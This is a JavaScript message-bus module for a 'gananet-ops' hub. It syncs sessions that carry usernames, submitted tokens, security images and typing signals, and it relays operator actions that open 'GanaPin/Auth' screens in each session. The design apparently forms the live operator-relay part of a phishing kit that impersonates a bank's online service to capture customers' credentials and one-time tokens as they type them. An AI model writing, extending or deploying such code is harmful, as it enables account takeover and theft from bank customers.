const CHANNEL = 'gananet-ops'
const STORAGE_KEY = 'gananet-ops-event'
const SESSIONS_KEY = 'gananet-ops-sessions'
/** Keep action cursors across subscribe remounts so we don't miss panel actions. */
const actionSinceBySession = new Map()

function createId() {
  return `s_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`
}

function readSessions() {
  try {
    const raw = localStorage.getItem(SESSIONS_KEY)
    const list = raw ? JSON.parse(raw) : []
    return Array.isArray(list) ? list : []
  } catch {
    return []
  }
}

function writeSessions(list) {
  try {
    localStorage.setItem(SESSIONS_KEY, JSON.stringify(list))
  } catch {
    // ignore
  }
}

function upsertSessionLocal(session) {
  if (!session?.id) return readSessions()
  const list = readSessions()
  const idx = list.findIndex((item) => item.id === session.id)
  if (idx >= 0) list[idx] = { ...list[idx], ...session }
  else list.push(session)
  list.sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  writeSessions(list)
  return list
}

async function postJson(url, body) {
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })
  if (!res.ok) throw new Error(`ops hub ${res.status}`)
  return res.json()
}

/** Same-browser fast path + shared Vite hub for Chrome ↔ Edge. */
function publish(message) {
  const payload = { ...message, ts: Date.now() }

  if (payload.type === 'session:created' && payload.session) {
    upsertSessionLocal(payload.session)
    postJson('/api/ops/sessions', payload.session).catch(() => {})
  }
  if (payload.type === 'session:action' && payload.sessionId && payload.action) {
    postJson('/api/ops/actions', {
      sessionId: payload.sessionId,
      action: payload.action,
      image: payload.image || '',
    }).catch(() => {})
  }
  if (payload.type === 'session:token' && payload.sessionId != null) {
    postJson('/api/ops/token', {
      sessionId: payload.sessionId,
      token: payload.token || '',
      submitted: Boolean(payload.submitted),
    }).catch(() => {})
  }
  if (payload.type === 'session:typing' && payload.sessionId) {
    postJson('/api/ops/token', {
      sessionId: payload.sessionId,
      typingOnly: true,
    }).catch(() => {})
  }
  if (payload.type === 'session:ping' && payload.sessionId) {
    postJson('/api/ops/ping', { sessionId: payload.sessionId }).catch(() => {})
  }

  try {
    const ch = new BroadcastChannel(CHANNEL)
    // No mandar dataURL gigante por BC (puede fallar); el hub ya la tiene
    const forBc = payload.image
      ? { ...payload, image: payload.image.length > 20000 ? '' : payload.image }
      : payload
    ch.postMessage(forBc)
    ch.close()
  } catch {
    // ignore
  }
  try {
    const forStorage = payload.image
      ? { ...payload, image: '[omitted]' }
      : payload
    localStorage.setItem(STORAGE_KEY, JSON.stringify(forStorage))
    localStorage.removeItem(STORAGE_KEY)
  } catch {
    // ignore
  }
  return payload
}

/**
 * @param {(msg: any) => void} handler
 * @param {{ sessionId?: string | null, watchSessions?: boolean }} [options]
 */
function subscribe(handler, options = {}) {
  let ch
  try {
    ch = new BroadcastChannel(CHANNEL)
    ch.onmessage = (event) => handler(event.data)
  } catch {
    ch = null
  }

  function onStorage(event) {
    if (event.key !== STORAGE_KEY || !event.newValue) return
    try {
      handler(JSON.parse(event.newValue))
    } catch {
      // ignore
    }
  }
  window.addEventListener('storage', onStorage)

  const sessionId = options.sessionId || null
  let since = sessionId
    ? (actionSinceBySession.has(sessionId)
        ? actionSinceBySession.get(sessionId)
        : Date.now())
    : Date.now()
  let stopped = false
  let lastSessionSig = ''
  let lastRemoteSig = ''
  let timer = 0

  const poll = async () => {
    if (stopped) return
    try {
      if (options.watchSessions) {
        const res = await fetch('/api/ops/sessions')
        if (res.ok) {
          const data = await res.json()
          const list = data.sessions || []
          const sig = JSON.stringify(
            list.map((s) => [s.id, s.state, s.token, s.last_seen, s.username || s.user]),
          )
          if (sig !== lastSessionSig) {
            lastSessionSig = sig
            handler({ type: 'sessions:sync', sessions: list, ts: Date.now() })
          }
        }
      }

      if (sessionId) {
        // Estado de sesión (abre GanaPin/Auth aunque se pierda el evento de acción)
        const sessRes = await fetch('/api/ops/sessions')
        if (sessRes.ok) {
          const data = await sessRes.json()
          const remote = (data.sessions || []).find((s) => s.id === sessionId)
          if (remote) {
            const sig = [
              remote.state,
              remote.token || '',
              remote.securityImage ? String(remote.securityImage.length) : '0',
            ].join('|')
            if (sig !== lastRemoteSig) {
              lastRemoteSig = sig
              handler({ type: 'session:remote', session: remote, ts: Date.now() })
            }
          } else if (lastRemoteSig && lastRemoteSig !== 'gone') {
            lastRemoteSig = 'gone'
            handler({ type: 'session:gone', sessionId, ts: Date.now() })
          }
        }

        const res = await fetch(
          `/api/ops/actions?sessionId=${encodeURIComponent(sessionId)}&since=${since}`,
        )
        if (res.ok) {
          const data = await res.json()
          for (const a of data.actions || []) {
            since = Math.max(since, a.at)
            actionSinceBySession.set(sessionId, since)
            handler({
              type: 'session:action',
              sessionId: a.sessionId,
              action: a.action,
              image: a.image || '',
              ts: a.at,
            })
          }
        }
      }
    } catch {
      // hub may be restarting
    }
    if (!stopped) timer = window.setTimeout(poll, 700)
  }

  timer = window.setTimeout(poll, 200)

  return () => {
    stopped = true
    window.clearTimeout(timer)
    window.removeEventListener('storage', onStorage)
    try {
      ch?.close()
    } catch {
      // ignore
    }
  }
}

function sessionCreated(session) {
  return publish({ type: 'session:created', session })
}

function sendAction(sessionId, action) {
  return publish({ type: 'session:action', sessionId, action })
}

function tokenUpdate(sessionId, token, submitted = false) {
  return publish({ type: 'session:token', sessionId, token, submitted })
}

let lastTypingAt = 0
function setTyping(sessionId) {
  const now = Date.now()
  if (now - lastTypingAt < 600) return
  lastTypingAt = now
  return publish({ type: 'session:typing', sessionId })
}

function ping(sessionId) {
  return publish({ type: 'session:ping', sessionId })
}

export const opsBus = {
  createId,
  publish,
  subscribe,
  sessionCreated,
  sendAction,
  tokenUpdate,
  setTyping,
  ping,
  readSessions,
  writeSessions,
}

export default opsBus
